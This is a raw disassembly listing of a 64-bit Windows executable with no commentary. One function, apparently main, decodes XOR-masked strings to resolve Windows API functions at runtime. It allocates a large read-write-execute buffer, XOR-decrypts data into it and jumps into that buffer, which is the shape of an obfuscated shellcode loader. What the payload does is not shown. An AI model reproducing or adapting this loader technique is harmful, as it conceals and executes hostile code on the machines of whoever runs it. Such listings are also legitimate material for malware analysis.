   1400018dc:	4c 89 a5 30 03 00 00 	mov    %r12,0x330(%rbp)
   1400018e3:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400018ea:	48 89 85 30 01 00 00 	mov    %rax,0x130(%rbp)
   1400018f1:	4c 89 ad 30 03 00 00 	mov    %r13,0x330(%rbp)
   1400018f8:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1400018ff:	66 0f 6f 45 10       	movdqa 0x10(%rbp),%xmm0
   140001904:	48 89 85 38 01 00 00 	mov    %rax,0x138(%rbp)
   14000190b:	66 0f ef 85 30 01 00 	pxor   0x130(%rbp),%xmm0
   140001912:	00 
   140001913:	66 0f 7f 45 10       	movdqa %xmm0,0x10(%rbp)
   140001918:	ff 15 e2 c6 00 00    	call   *0xc6e2(%rip)        # 0x14000e000
   14000191e:	48 8b c8             	mov    %rax,%rcx
   140001921:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140001925:	ff 15 dd c6 00 00    	call   *0xc6dd(%rip)        # 0x14000e008
   14000192b:	49 8b ce             	mov    %r14,%rcx
   14000192e:	ff d0                	call   *%rax
   140001930:	8b c7                	mov    %edi,%eax
   140001932:	eb 05                	jmp    0x140001939
   140001934:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001939:	48 8b 9c 24 20 04 00 	mov    0x420(%rsp),%rbx
   140001940:	00 
   140001941:	48 81 c4 e0 03 00 00 	add    $0x3e0,%rsp
   140001948:	41 5f                	pop    %r15
   14000194a:	41 5e                	pop    %r14
   14000194c:	41 5d                	pop    %r13
   14000194e:	41 5c                	pop    %r12
   140001950:	5f                   	pop    %rdi
   140001951:	5e                   	pop    %rsi
   140001952:	5d                   	pop    %rbp
   140001953:	c3                   	ret
   140001954:	cc                   	int3
   140001955:	cc                   	int3
   140001956:	cc                   	int3
   140001957:	cc                   	int3
   140001958:	cc                   	int3
   140001959:	cc                   	int3
   14000195a:	cc                   	int3
   14000195b:	cc                   	int3
   14000195c:	cc                   	int3
   14000195d:	cc                   	int3
   14000195e:	cc                   	int3
   14000195f:	cc                   	int3
   140001960:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001965:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000196a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000196f:	55                   	push   %rbp
   140001970:	41 56                	push   %r14
   140001972:	41 57                	push   %r15
   140001974:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140001979:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   140001980:	48 b8 51 3a 0b 30 c9 	movabs $0x5051f2c9300b3a51,%rax
   140001987:	f2 51 50 
   14000198a:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   14000198e:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140001992:	48 bf 07 53 79 44 bc 	movabs $0x113d93bc44795307,%rdi
   140001999:	93 3d 11 
   14000199c:	48 8b 45 67          	mov    0x67(%rbp),%rax
   1400019a0:	48 be c0 a6 21 28 91 	movabs $0x698682912821a6c0,%rsi
   1400019a7:	82 86 69 
   1400019aa:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400019ae:	49 be 6c 36 0b 2a d9 	movabs $0x230effd92a0b366c,%r14
   1400019b5:	ff 0e 23 
   1400019b8:	48 b8 ac ca 4e 4b 91 	movabs $0x698682914b4ecaac,%rax
   1400019bf:	82 86 69 
   1400019c2:	49 bf ee c2 4d 44 91 	movabs $0x69868291444dc2ee,%r15
   1400019c9:	82 86 69 
   1400019cc:	48 89 45 67          	mov    %rax,0x67(%rbp)
   1400019d0:	48 8b 45 67          	mov    0x67(%rbp),%rax
   1400019d4:	48 89 45 bf          	mov    %rax,-0x41(%rbp)
   1400019d8:	48 89 7d 67          	mov    %rdi,0x67(%rbp)
   1400019dc:	48 8b 45 67          	mov    0x67(%rbp),%rax
   1400019e0:	48 89 75 67          	mov    %rsi,0x67(%rbp)
   1400019e4:	48 89 45 f7          	mov    %rax,-0x9(%rbp)
   1400019e8:	48 8b 45 67          	mov    0x67(%rbp),%rax
   1400019ec:	66 0f 6f 45 b7       	movdqa -0x49(%rbp),%xmm0
   1400019f1:	48 89 45 ff          	mov    %rax,-0x1(%rbp)
   1400019f5:	66 0f ef 45 f7       	pxor   -0x9(%rbp),%xmm0
   1400019fa:	66 0f 7f 45 b7       	movdqa %xmm0,-0x49(%rbp)
   1400019ff:	4c 89 75 67          	mov    %r14,0x67(%rbp)
   140001a03:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001a07:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   140001a0b:	4c 89 7d 67          	mov    %r15,0x67(%rbp)
   140001a0f:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001a13:	48 89 45 af          	mov    %rax,-0x51(%rbp)
   140001a17:	48 89 7d 67          	mov    %rdi,0x67(%rbp)
   140001a1b:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001a1f:	48 89 45 07          	mov    %rax,0x7(%rbp)
   140001a23:	48 89 75 67          	mov    %rsi,0x67(%rbp)
   140001a27:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001a2b:	66 0f 6f 45 a7       	movdqa -0x59(%rbp),%xmm0
   140001a30:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   140001a34:	66 0f ef 45 07       	pxor   0x7(%rbp),%xmm0
   140001a39:	66 0f 7f 45 a7       	movdqa %xmm0,-0x59(%rbp)
   140001a3e:	ff 15 bc c5 00 00    	call   *0xc5bc(%rip)        # 0x14000e000
   140001a44:	48 8b c8             	mov    %rax,%rcx
   140001a47:	48 8d 55 b7          	lea    -0x49(%rbp),%rdx
   140001a4b:	ff 15 b7 c5 00 00    	call   *0xc5b7(%rip)        # 0x14000e008
   140001a51:	33 c9                	xor    %ecx,%ecx
   140001a53:	ba 00 00 50 00       	mov    $0x500000,%edx
   140001a58:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140001a5e:	44 8d 49 40          	lea    0x40(%rcx),%r9d
   140001a62:	ff d0                	call   *%rax
   140001a64:	48 89 05 85 71 01 00 	mov    %rax,0x17185(%rip)        # 0x140018bf0
   140001a6b:	48 8b d8             	mov    %rax,%rbx
   140001a6e:	48 85 c0             	test   %rax,%rax
   140001a71:	0f 84 97 01 00 00    	je     0x140001c0e
   140001a77:	33 d2                	xor    %edx,%edx
   140001a79:	41 b8 00 00 50 00    	mov    $0x500000,%r8d
   140001a7f:	48 8b c8             	mov    %rax,%rcx
   140001a82:	e8 f9 0e 00 00       	call   0x140002980
   140001a87:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001a8d:	c7 44 24 28 00 00 50 	movl   $0x500000,0x28(%rsp)
   140001a94:	00 
   140001a95:	4c 8d 05 64 5f 01 00 	lea    0x15f64(%rip),%r8        # 0x140017a00
   140001a9c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001aa1:	ba 14 1e 00 00       	mov    $0x1e14,%edx
   140001aa6:	b9 6e 2a 04 18       	mov    $0x18042a6e,%ecx
   140001aab:	e8 50 f5 ff ff       	call   0x140001000
   140001ab0:	4c 8b 15 39 71 01 00 	mov    0x17139(%rip),%r10        # 0x140018bf0
   140001ab7:	33 c9                	xor    %ecx,%ecx
   140001ab9:	89 05 39 71 01 00    	mov    %eax,0x17139(%rip)        # 0x140018bf8
   140001abf:	4c 63 c8             	movslq %eax,%r9
   140001ac2:	85 c0                	test   %eax,%eax
   140001ac4:	7e 3c                	jle    0x140001b02
   140001ac6:	4d 8b c2             	mov    %r10,%r8
   140001ac9:	4c 8d 1d 38 5f 01 00 	lea    0x15f38(%rip),%r11        # 0x140017a08
   140001ad0:	b8 93 24 49 92       	mov    $0x92492493,%eax
   140001ad5:	4d 8d 40 01          	lea    0x1(%r8),%r8
   140001ad9:	f7 e9                	imul   %ecx
   140001adb:	03 d1                	add    %ecx,%edx
   140001add:	c1 fa 02             	sar    $0x2,%edx
   140001ae0:	8b c2                	mov    %edx,%eax
   140001ae2:	c1 e8 1f             	shr    $0x1f,%eax
   140001ae5:	03 d0                	add    %eax,%edx
   140001ae7:	6b c2 07             	imul   $0x7,%edx,%eax
   140001aea:	8b d1                	mov    %ecx,%edx
   140001aec:	ff c1                	inc    %ecx
   140001aee:	2b d0                	sub    %eax,%edx
   140001af0:	48 63 c2             	movslq %edx,%rax
   140001af3:	41 0f b6 04 83       	movzbl (%r11,%rax,4),%eax
   140001af8:	41 30 40 ff          	xor    %al,-0x1(%r8)
   140001afc:	49 83 e9 01          	sub    $0x1,%r9
   140001b00:	75 ce                	jne    0x140001ad0
   140001b02:	4d 85 d2             	test   %r10,%r10
   140001b05:	74 03                	je     0x140001b0a
   140001b07:	41 ff d2             	call   *%r10
   140001b0a:	48 ba c1 b0 57 12 56 	movabs $0xdc4824561257b0c1,%rdx
   140001b11:	24 48 dc 
   140001b14:	48 b9 42 da 05 a5 7b 	movabs $0x76017b7ba505da42,%rcx
   140001b1b:	7b 01 76 
   140001b1e:	48 b8 53 36 0b 29 d5 	movabs $0x655cfdd5290b3653,%rax
   140001b25:	fd 5c 65 
   140001b28:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140001b2c:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b30:	48 89 45 d7          	mov    %rax,-0x29(%rbp)
   140001b34:	48 b8 a5 f6 53 47 f2 	movabs $0x1af5e7f24753f6a5,%rax
   140001b3b:	e7 f5 1a 
   140001b3e:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140001b42:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b46:	48 89 45 df          	mov    %rax,-0x21(%rbp)
   140001b4a:	48 89 55 67          	mov    %rdx,0x67(%rbp)
   140001b4e:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b52:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   140001b56:	48 89 4d 67          	mov    %rcx,0x67(%rbp)
   140001b5a:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b5e:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   140001b62:	48 89 7d 67          	mov    %rdi,0x67(%rbp)
   140001b66:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b6a:	48 89 75 67          	mov    %rsi,0x67(%rbp)
   140001b6e:	48 89 45 27          	mov    %rax,0x27(%rbp)
   140001b72:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b76:	48 89 55 67          	mov    %rdx,0x67(%rbp)
   140001b7a:	48 89 45 2f          	mov    %rax,0x2f(%rbp)
   140001b7e:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b82:	48 89 4d 67          	mov    %rcx,0x67(%rbp)
   140001b86:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   140001b8a:	48 89 45 37          	mov    %rax,0x37(%rbp)
   140001b8e:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001b92:	66 0f 6f 45 d7       	movdqa -0x29(%rbp),%xmm0
   140001b97:	66 0f 6f 4d e7       	movdqa -0x19(%rbp),%xmm1
   140001b9c:	66 0f ef 45 27       	pxor   0x27(%rbp),%xmm0
   140001ba1:	66 0f 7f 45 d7       	movdqa %xmm0,-0x29(%rbp)
   140001ba6:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001baa:	66 0f ef 4d 37       	pxor   0x37(%rbp),%xmm1
   140001baf:	66 0f 7f 4d e7       	movdqa %xmm1,-0x19(%rbp)
   140001bb4:	4c 89 75 67          	mov    %r14,0x67(%rbp)
   140001bb8:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001bbc:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140001bc0:	4c 89 7d 67          	mov    %r15,0x67(%rbp)
   140001bc4:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001bc8:	48 89 45 cf          	mov    %rax,-0x31(%rbp)
   140001bcc:	48 89 7d 67          	mov    %rdi,0x67(%rbp)
   140001bd0:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001bd4:	48 89 45 17          	mov    %rax,0x17(%rbp)
   140001bd8:	48 89 75 67          	mov    %rsi,0x67(%rbp)
   140001bdc:	48 8b 45 67          	mov    0x67(%rbp),%rax
   140001be0:	66 0f 6f 45 c7       	movdqa -0x39(%rbp),%xmm0
   140001be5:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   140001be9:	66 0f ef 45 17       	pxor   0x17(%rbp),%xmm0
   140001bee:	66 0f 7f 45 c7       	movdqa %xmm0,-0x39(%rbp)
   140001bf3:	ff 15 07 c4 00 00    	call   *0xc407(%rip)        # 0x14000e000
   140001bf9:	48 8b c8             	mov    %rax,%rcx
   140001bfc:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   140001c00:	ff 15 02 c4 00 00    	call   *0xc402(%rip)        # 0x14000e008
   140001c06:	33 d2                	xor    %edx,%edx
   140001c08:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
   140001c0c:	ff d0                	call   *%rax
   140001c0e:	4c 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%r11
   140001c15:	00 
   140001c16:	33 c0                	xor    %eax,%eax
   140001c18:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001c1c:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140001c20:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140001c24:	49 8b e3             	mov    %r11,%rsp
   140001c27:	41 5f                	pop    %r15
   140001c29:	41 5e                	pop    %r14
   140001c2b:	5d                   	pop    %rbp
   140001c2c:	c3                   	ret
   140001c2d:	cc                   	int3
   140001c2e:	cc                   	int3
   140001c2f:	cc                   	int3
   140001c30:	40 53                	rex push %rbx
   140001c32:	48 83 ec 20          	sub    $0x20,%rsp
   140001c36:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001c3b:	e8 54 1d 00 00       	call   0x140003994
   140001c40:	e8 67 05 00 00       	call   0x1400021ac
   140001c45:	8b c8                	mov    %eax,%ecx
   140001c47:	e8 94 28 00 00       	call   0x1400044e0
   140001c4c:	e8 4f 05 00 00       	call   0x1400021a0
   140001c51:	8b d8                	mov    %eax,%ebx
   140001c53:	e8 4c 2a 00 00       	call   0x1400046a4
   140001c58:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001c5d:	89 18                	mov    %ebx,(%rax)
   140001c5f:	e8 c8 02 00 00       	call   0x140001f2c
   140001c64:	84 c0                	test   %al,%al
   140001c66:	74 73                	je     0x140001cdb
   140001c68:	e8 c3 07 00 00       	call   0x140002430
   140001c6d:	48 8d 0d f8 07 00 00 	lea    0x7f8(%rip),%rcx        # 0x14000246c
   140001c74:	e8 63 04 00 00       	call   0x1400020dc
   140001c79:	e8 26 05 00 00       	call   0x1400021a4
   140001c7e:	8b c8                	mov    %eax,%ecx
   140001c80:	e8 b7 1f 00 00       	call   0x140003c3c
   140001c85:	85 c0                	test   %eax,%eax
   140001c87:	75 52                	jne    0x140001cdb
   140001c89:	e8 26 05 00 00       	call   0x1400021b4
   140001c8e:	e8 65 05 00 00       	call   0x1400021f8
   140001c93:	85 c0                	test   %eax,%eax
   140001c95:	74 0c                	je     0x140001ca3
   140001c97:	48 8d 0d 02 05 00 00 	lea    0x502(%rip),%rcx        # 0x1400021a0
   140001c9e:	e8 51 1d 00 00       	call   0x1400039f4
   140001ca3:	e8 20 05 00 00       	call   0x1400021c8
   140001ca8:	e8 1b 05 00 00       	call   0x1400021c8
   140001cad:	e8 ee 04 00 00       	call   0x1400021a0
   140001cb2:	8b c8                	mov    %eax,%ecx
   140001cb4:	e8 4b 29 00 00       	call   0x140004604
   140001cb9:	e8 06 05 00 00       	call   0x1400021c4
   140001cbe:	84 c0                	test   %al,%al
   140001cc0:	74 05                	je     0x140001cc7
   140001cc2:	e8 85 24 00 00       	call   0x14000414c
   140001cc7:	e8 d4 04 00 00       	call   0x1400021a0
   140001ccc:	e8 97 06 00 00       	call   0x140002368
   140001cd1:	85 c0                	test   %eax,%eax
   140001cd3:	75 06                	jne    0x140001cdb
   140001cd5:	48 83 c4 20          	add    $0x20,%rsp
   140001cd9:	5b                   	pop    %rbx
   140001cda:	c3                   	ret
   140001cdb:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001ce0:	e8 37 05 00 00       	call   0x14000221c
   140001ce5:	cc                   	int3
   140001ce6:	cc                   	int3
   140001ce7:	cc                   	int3
   140001ce8:	48 83 ec 28          	sub    $0x28,%rsp
   140001cec:	e8 eb 04 00 00       	call   0x1400021dc
   140001cf1:	33 c0                	xor    %eax,%eax
   140001cf3:	48 83 c4 28          	add    $0x28,%rsp
   140001cf7:	c3                   	ret
   140001cf8:	48 83 ec 28          	sub    $0x28,%rsp
   140001cfc:	e8 c3 06 00 00       	call   0x1400023c4
   140001d01:	e8 9a 04 00 00       	call   0x1400021a0
   140001d06:	8b c8                	mov    %eax,%ecx
   140001d08:	48 83 c4 28          	add    $0x28,%rsp
   140001d0c:	e9 67 29 00 00       	jmp    0x140004678
   140001d11:	cc                   	int3
   140001d12:	cc                   	int3
   140001d13:	cc                   	int3
   140001d14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d19:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001d1e:	57                   	push   %rdi
   140001d1f:	48 83 ec 30          	sub    $0x30,%rsp
   140001d23:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001d28:	e8 b3 01 00 00       	call   0x140001ee0
   140001d2d:	84 c0                	test   %al,%al
   140001d2f:	0f 84 36 01 00 00    	je     0x140001e6b
   140001d35:	40 32 f6             	xor    %sil,%sil
   140001d38:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140001d3d:	e8 62 01 00 00       	call   0x140001ea4
   140001d42:	8a d8                	mov    %al,%bl
   140001d44:	8b 0d e6 5c 01 00    	mov    0x15ce6(%rip),%ecx        # 0x140017a30
   140001d4a:	83 f9 01             	cmp    $0x1,%ecx
   140001d4d:	0f 84 23 01 00 00    	je     0x140001e76
   140001d53:	85 c9                	test   %ecx,%ecx
   140001d55:	75 4a                	jne    0x140001da1
   140001d57:	c7 05 cf 5c 01 00 01 	movl   $0x1,0x15ccf(%rip)        # 0x140017a30
   140001d5e:	00 00 00 
   140001d61:	48 8d 15 38 c5 00 00 	lea    0xc538(%rip),%rdx        # 0x14000e2a0
   140001d68:	48 8d 0d f9 c4 00 00 	lea    0xc4f9(%rip),%rcx        # 0x14000e268
   140001d6f:	e8 44 24 00 00       	call   0x1400041b8
   140001d74:	85 c0                	test   %eax,%eax
   140001d76:	74 0a                	je     0x140001d82
   140001d78:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001d7d:	e9 d9 00 00 00       	jmp    0x140001e5b
   140001d82:	48 8d 15 d7 c4 00 00 	lea    0xc4d7(%rip),%rdx        # 0x14000e260
   140001d89:	48 8d 0d c0 c4 00 00 	lea    0xc4c0(%rip),%rcx        # 0x14000e250
   140001d90:	e8 bf 23 00 00       	call   0x140004154
   140001d95:	c7 05 91 5c 01 00 02 	movl   $0x2,0x15c91(%rip)        # 0x140017a30
   140001d9c:	00 00 00 
   140001d9f:	eb 08                	jmp    0x140001da9
   140001da1:	40 b6 01             	mov    $0x1,%sil
   140001da4:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140001da9:	8a cb                	mov    %bl,%cl
   140001dab:	e8 a0 02 00 00       	call   0x140002050
   140001db0:	e8 4f 04 00 00       	call   0x140002204
   140001db5:	48 8b d8             	mov    %rax,%rbx
   140001db8:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001dbc:	74 1e                	je     0x140001ddc
   140001dbe:	48 8b c8             	mov    %rax,%rcx
   140001dc1:	e8 f2 01 00 00       	call   0x140001fb8
   140001dc6:	84 c0                	test   %al,%al
   140001dc8:	74 12                	je     0x140001ddc
   140001dca:	45 33 c0             	xor    %r8d,%r8d
   140001dcd:	41 8d 50 02          	lea    0x2(%r8),%edx
   140001dd1:	33 c9                	xor    %ecx,%ecx
   140001dd3:	48 8b 03             	mov    (%rbx),%rax
   140001dd6:	ff 15 5c c4 00 00    	call   *0xc45c(%rip)        # 0x14000e238
   140001ddc:	e8 2b 04 00 00       	call   0x14000220c
   140001de1:	48 8b d8             	mov    %rax,%rbx
   140001de4:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001de8:	74 14                	je     0x140001dfe
   140001dea:	48 8b c8             	mov    %rax,%rcx
   140001ded:	e8 c6 01 00 00       	call   0x140001fb8
   140001df2:	84 c0                	test   %al,%al
   140001df4:	74 08                	je     0x140001dfe
   140001df6:	48 8b 0b             	mov    (%rbx),%rcx
   140001df9:	e8 9a 26 00 00       	call   0x140004498
   140001dfe:	e8 f9 22 00 00       	call   0x1400040fc
   140001e03:	48 8b f8             	mov    %rax,%rdi
   140001e06:	e8 45 27 00 00       	call   0x140004550
   140001e0b:	48 8b 18             	mov    (%rax),%rbx
   140001e0e:	e8 35 27 00 00       	call   0x140004548
   140001e13:	4c 8b c7             	mov    %rdi,%r8
   140001e16:	48 8b d3             	mov    %rbx,%rdx
   140001e19:	8b 08                	mov    (%rax),%ecx
   140001e1b:	e8 40 fb ff ff       	call   0x140001960
   140001e20:	8b d8                	mov    %eax,%ebx
   140001e22:	e8 49 05 00 00       	call   0x140002370
   140001e27:	84 c0                	test   %al,%al
   140001e29:	74 55                	je     0x140001e80
   140001e2b:	40 84 f6             	test   %sil,%sil
   140001e2e:	75 05                	jne    0x140001e35
   140001e30:	e8 47 26 00 00       	call   0x14000447c
   140001e35:	33 d2                	xor    %edx,%edx
   140001e37:	b1 01                	mov    $0x1,%cl
   140001e39:	e8 36 02 00 00       	call   0x140002074
   140001e3e:	8b c3                	mov    %ebx,%eax
   140001e40:	eb 19                	jmp    0x140001e5b
   140001e42:	8b d8                	mov    %eax,%ebx
   140001e44:	e8 27 05 00 00       	call   0x140002370
   140001e49:	84 c0                	test   %al,%al
   140001e4b:	74 3b                	je     0x140001e88
   140001e4d:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001e52:	75 05                	jne    0x140001e59
   140001e54:	e8 13 26 00 00       	call   0x14000446c
   140001e59:	8b c3                	mov    %ebx,%eax
   140001e5b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001e60:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001e65:	48 83 c4 30          	add    $0x30,%rsp
   140001e69:	5f                   	pop    %rdi
   140001e6a:	c3                   	ret
   140001e6b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001e70:	e8 a7 03 00 00       	call   0x14000221c
   140001e75:	90                   	nop
   140001e76:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001e7b:	e8 9c 03 00 00       	call   0x14000221c
   140001e80:	8b cb                	mov    %ebx,%ecx
   140001e82:	e8 4d 26 00 00       	call   0x1400044d4
   140001e87:	90                   	nop
   140001e88:	8b cb                	mov    %ebx,%ecx
   140001e8a:	e8 fd 25 00 00       	call   0x14000448c
   140001e8f:	90                   	nop
   140001e90:	48 83 ec 28          	sub    $0x28,%rsp
   140001e94:	e8 5b 02 00 00       	call   0x1400020f4
   140001e99:	48 83 c4 28          	add    $0x28,%rsp
   140001e9d:	e9 72 fe ff ff       	jmp    0x140001d14
   140001ea2:	cc                   	int3
   140001ea3:	cc                   	int3
   140001ea4:	48 83 ec 28          	sub    $0x28,%rsp
   140001ea8:	e8 9f 07 00 00       	call   0x14000264c
   140001ead:	85 c0                	test   %eax,%eax
   140001eaf:	74 21                	je     0x140001ed2
   140001eb1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001eb8:	00 00 
   140001eba:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001ebe:	eb 05                	jmp    0x140001ec5
   140001ec0:	48 3b c8             	cmp    %rax,%rcx
   140001ec3:	74 14                	je     0x140001ed9
   140001ec5:	33 c0                	xor    %eax,%eax
   140001ec7:	f0 48 0f b1 0d 68 5b 	lock cmpxchg %rcx,0x15b68(%rip)        # 0x140017a38
   140001ece:	01 00 
   140001ed0:	75 ee                	jne    0x140001ec0
   140001ed2:	32 c0                	xor    %al,%al
   140001ed4:	48 83 c4 28          	add    $0x28,%rsp
   140001ed8:	c3                   	ret
   140001ed9:	b0 01                	mov    $0x1,%al
   140001edb:	eb f7                	jmp    0x140001ed4
   140001edd:	cc                   	int3
   140001ede:	cc                   	int3
   140001edf:	cc                   	int3
   140001ee0:	40 53                	rex push %rbx
   140001ee2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ee6:	0f b6 05 53 5b 01 00 	movzbl 0x15b53(%rip),%eax        # 0x140017a40
   140001eed:	85 c9                	test   %ecx,%ecx
   140001eef:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001ef4:	0f 44 c3             	cmove  %ebx,%eax
   140001ef7:	88 05 43 5b 01 00    	mov    %al,0x15b43(%rip)        # 0x140017a40
   140001efd:	e8 a6 05 00 00       	call   0x1400024a8
   140001f02:	e8 01 0a 00 00       	call   0x140002908
   140001f07:	84 c0                	test   %al,%al
   140001f09:	75 04                	jne    0x140001f0f
   140001f0b:	32 c0                	xor    %al,%al
   140001f0d:	eb 14                	jmp    0x140001f23
   140001f0f:	e8 c0 2c 00 00       	call   0x140004bd4
   140001f14:	84 c0                	test   %al,%al
   140001f16:	75 09                	jne    0x140001f21
   140001f18:	33 c9                	xor    %ecx,%ecx
   140001f1a:	e8 11 0a 00 00       	call   0x140002930
   140001f1f:	eb ea                	jmp    0x140001f0b
   140001f21:	8a c3                	mov    %bl,%al
   140001f23:	48 83 c4 20          	add    $0x20,%rsp
   140001f27:	5b                   	pop    %rbx
   140001f28:	c3                   	ret
   140001f29:	cc                   	int3
   140001f2a:	cc                   	int3
   140001f2b:	cc                   	int3
   140001f2c:	40 53                	rex push %rbx
   140001f2e:	48 83 ec 20          	sub    $0x20,%rsp
   140001f32:	80 3d 08 5b 01 00 00 	cmpb   $0x0,0x15b08(%rip)        # 0x140017a41
   140001f39:	8b d9                	mov    %ecx,%ebx
   140001f3b:	75 67                	jne    0x140001fa4
   140001f3d:	83 f9 01             	cmp    $0x1,%ecx
   140001f40:	77 6a                	ja     0x140001fac
   140001f42:	e8 05 07 00 00       	call   0x14000264c
   140001f47:	85 c0                	test   %eax,%eax
   140001f49:	74 28                	je     0x140001f73
   140001f4b:	85 db                	test   %ebx,%ebx
   140001f4d:	75 24                	jne    0x140001f73
   140001f4f:	48 8d 0d f2 5a 01 00 	lea    0x15af2(%rip),%rcx        # 0x140017a48
   140001f56:	e8 dd 2a 00 00       	call   0x140004a38
   140001f5b:	85 c0                	test   %eax,%eax
   140001f5d:	75 10                	jne    0x140001f6f
   140001f5f:	48 8d 0d fa 5a 01 00 	lea    0x15afa(%rip),%rcx        # 0x140017a60
   140001f66:	e8 cd 2a 00 00       	call   0x140004a38
   140001f6b:	85 c0                	test   %eax,%eax
   140001f6d:	74 2e                	je     0x140001f9d
   140001f6f:	32 c0                	xor    %al,%al
   140001f71:	eb 33                	jmp    0x140001fa6
   140001f73:	66 0f 6f 05 65 c3 00 	movdqa 0xc365(%rip),%xmm0        # 0x14000e2e0
   140001f7a:	00 
   140001f7b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001f7f:	f3 0f 7f 05 c1 5a 01 	movdqu %xmm0,0x15ac1(%rip)        # 0x140017a48
   140001f86:	00 
   140001f87:	48 89 05 ca 5a 01 00 	mov    %rax,0x15aca(%rip)        # 0x140017a58
   140001f8e:	f3 0f 7f 05 ca 5a 01 	movdqu %xmm0,0x15aca(%rip)        # 0x140017a60
   140001f95:	00 
   140001f96:	48 89 05 d3 5a 01 00 	mov    %rax,0x15ad3(%rip)        # 0x140017a70
   140001f9d:	c6 05 9d 5a 01 00 01 	movb   $0x1,0x15a9d(%rip)        # 0x140017a41
   140001fa4:	b0 01                	mov    $0x1,%al
   140001fa6:	48 83 c4 20          	add    $0x20,%rsp
   140001faa:	5b                   	pop    %rbx
   140001fab:	c3                   	ret
   140001fac:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001fb1:	e8 66 02 00 00       	call   0x14000221c
   140001fb6:	cc                   	int3
   140001fb7:	cc                   	int3
   140001fb8:	48 83 ec 18          	sub    $0x18,%rsp
   140001fbc:	4c 8b c1             	mov    %rcx,%r8
   140001fbf:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001fc4:	66 39 05 35 e0 ff ff 	cmp    %ax,-0x1fcb(%rip)        # 0x140000000
   140001fcb:	75 78                	jne    0x140002045
   140001fcd:	48 63 0d 68 e0 ff ff 	movslq -0x1f98(%rip),%rcx        # 0x14000003c
   140001fd4:	48 8d 15 25 e0 ff ff 	lea    -0x1fdb(%rip),%rdx        # 0x140000000
   140001fdb:	48 03 ca             	add    %rdx,%rcx
   140001fde:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001fe4:	75 5f                	jne    0x140002045
   140001fe6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001feb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001fef:	75 54                	jne    0x140002045
   140001ff1:	4c 2b c2             	sub    %rdx,%r8
   140001ff4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140001ff8:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   140001ffc:	48 03 d0             	add    %rax,%rdx
   140001fff:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140002003:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140002007:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   14000200b:	48 89 14 24          	mov    %rdx,(%rsp)
   14000200f:	49 3b d1             	cmp    %r9,%rdx
